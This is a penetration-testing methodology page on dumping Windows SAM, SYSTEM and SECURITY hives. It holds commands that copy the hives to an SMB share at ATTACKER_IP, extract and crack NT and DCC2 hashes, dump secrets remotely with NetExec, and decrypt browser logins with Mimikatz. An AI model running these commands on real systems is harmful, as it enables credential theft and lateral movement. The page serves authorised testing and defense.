---
layout: page
title: "SAM, SYSTEM and SECURITY"
subtitle: "Dumping local account hashes, cached domain logons and DPAPI keys from registry hives"
permalink: /methodology/passwords/sam-system-security/
---

With local administrator access to a Windows host, the SAM, SYSTEM and SECURITY registry hives can be copied and parsed offline. SAM holds the NT hashes of local accounts, SYSTEM holds the boot key needed to decrypt them, and SECURITY holds LSA secrets, cached domain logon hashes (DCC2) and DPAPI key material. This page covers the copy, transfer and offline parsing workflow.

## Registry hives

| Hive | Contents | Why it matters |
|------|----------|----------------|
| `HKLM\SAM` | NT and LM hashes for local accounts | Hashes to crack or reuse |
| `HKLM\SYSTEM` | System boot key | Required to decrypt SAM and SECURITY |
| `HKLM\SECURITY` | LSA secrets, DCC2 cached logons, DPAPI keys | Domain-related and per-user secrets |

## Workflow

1. Confirm local administrator rights before touching the hives.
2. Save all three hives in one pass, so the SYSTEM copy matches the SAM copy.
3. Move the copies to the attack host through an SMB share or another approved channel.
4. Parse the copies offline, so no further interaction with the live host is needed.
5. Crack the NT hashes or test them for reuse.

```powershell
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

On the attack host, host the copies with Impacket's SMB server and copy them into the share:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/USERNAME/Documents/
```

```powershell
copy C:\sam.save \\ATTACKER_IP\CompData
copy C:\security.save \\ATTACKER_IP\CompData
copy C:\system.save \\ATTACKER_IP\CompData
```

Use `copy` rather than `move` unless removing the originals from the target is intended. The copies on the target are artefacts that must be deleted after transfer.

## Parsing the hives

```bash
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

The tool first reads the boot key from SYSTEM, then decrypts SAM. Output uses the format `user:rid:lmhash:nthash`. Extract only the NT hash field when a cracking list is needed:

```bash
awk -F: '{print $4}' samdump.txt
```

Crack NT hashes with Hashcat mode `1000`:

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

Remote variants run through NetExec with local administrator credentials:

```bash
netexec smb TARGET_IP --local-auth -u USERNAME -p PASSWORD --sam
netexec smb TARGET_IP --local-auth -u USERNAME -p PASSWORD --lsa
```

## What to look for

- The NT hash of the local Administrator, which is often identical across hosts built from one image. Test it against other systems.
- Hashes that match domain or service accounts, which confirm password reuse.
- DCC2 entries in SECURITY, which show that domain users have logged on to this host. These are slow to crack (Hashcat mode `2100`), so prioritise NT hashes.
- Saved browser, Outlook or RDP credentials that DPAPI can decrypt (see below).

## DPAPI

SECURITY holds machine and user DPAPI keys. DPAPI protects saved credentials for browsers, mail clients, Remote Desktop and Credential Manager. With access to the user's profile and the key material, Mimikatz or Impacket can decrypt the stored secrets:

```powershell
mimikatz # dpapi::chrome /in:"C:\Users\USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

## Pitfalls

- Mixing hive copies taken at different times. The SYSTEM hive must match the SAM and SECURITY copies, or the boot key will not decrypt them.
- Hashcat mode mismatches. NT is `1000`, DCC2 is `2100`, and the output of the wrong mode produces no results.
- Older Windows builds may show a populated LM hash. Focus on the NT field.

> Hive copies contain every local hash on the host. Delete the copies from the target after transfer and record the cleanup in the engagement notes.
{: .warning }

> The SYSTEM hive is the key to SAM and SECURITY. Always save it in the same operation as the other two hives.
{: .info }

## Defense and prevention

Limit local administrator membership and give each host a unique local administrator password, so one recovered hash does not open the whole estate. Audit access to the three hives and to `reg.exe save` on servers. Apply the controls on the [password prevention](/methodology/passwords/prevention/) page to the cached credential and DPAPI findings.
